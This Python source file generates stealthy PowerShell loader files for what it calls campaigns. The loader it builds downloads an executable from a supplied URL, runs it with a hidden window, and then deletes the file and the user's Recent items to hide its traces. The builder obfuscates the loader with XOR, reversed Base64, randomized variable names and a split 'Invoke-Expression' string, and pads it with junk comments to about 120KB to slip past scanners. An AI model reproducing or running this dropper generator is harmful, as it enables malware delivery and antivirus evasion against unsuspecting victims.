import base64
import random
import string
from pathlib import Path

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def generate_payload_text(payload_url: str,
                          payload_name: str,
                          campaign_id: str,
                          min_size_kb: int = 115,
                          max_size_kb: int = 125) -> str:
    """
    Generates a stealth PowerShell loader (.txt) with byte-level XOR, Base64, and reversed encoding.
    File size ~120KB with junk padding. Executes payload.exe from URL.
    Compatible with GUI-based campaign folder logic.
    """

    # Clean PowerShell execution logic
    core_code = (
        f"$u='{payload_url}';"
        f"$n='{payload_name}';"
        f"$p=$env:TEMP+'\\\\'+$n;"
        f"$wc=New-Object Net.WebClient;"
        f"$wc.DownloadFile($u,$p);"
        f"$null=Start-Process -WindowStyle Hidden -FilePath $p;"
        f"for($i=0;$i -lt 10;$i++){{Start-Sleep -Milliseconds 500; if(!(Get-Process | Where-Object {{$_.Path -eq $p}})){{break}}}};"
        f"Try{{Remove-Item $p -Force -ErrorAction SilentlyContinue}}Catch{{}};"
        f"Try{{Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Recent\\*\" -Force -ErrorAction SilentlyContinue}}Catch{{}};"
    ).encode("utf-8")

    xor_key = random.randint(30, 120)
    encoded = base64.b64encode(xor_bytes(core_code, xor_key)).decode()[::-1]

    v = [generate_random_var() for _ in range(8)]
    lines = [
        f"${v[0]}={xor_key}",
        f"${v[1]}=\"{encoded}\"",
        f"${v[2]}=(${v[1]}[-1..-${v[1]}.Length] -join '')",
        f"${v[2]}=[System.Convert]::FromBase64String(${v[2]})",
        f"${v[3]}=@();foreach(${v[4]} in ${v[2]}){{${v[3]}+=[byte](${v[4]} -bxor ${v[0]})}}",
        f"${v[5]}=[System.Text.Encoding]::UTF8.GetString(${v[3]})",
        f"${v[6]}='In'+'voke-Expression'",
        f"&((Get-Command ${v[6]}).Name) ${v[5]}"
    ]

    # Size padding
    target_size = random.randint(min_size_kb * 1024, max_size_kb * 1024)
    junk_line = lambda: f"# {''.join(random.choices(string.ascii_letters + string.digits, k=60))}"
    while len("\n".join(lines).encode("utf-8")) < target_size:
        lines.append(junk_line())

    # Save output
    output_dir = Path("tmp_payloads")
    output_dir.mkdir(exist_ok=True)
    file_path = output_dir / f"{campaign_id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    return str(file_path)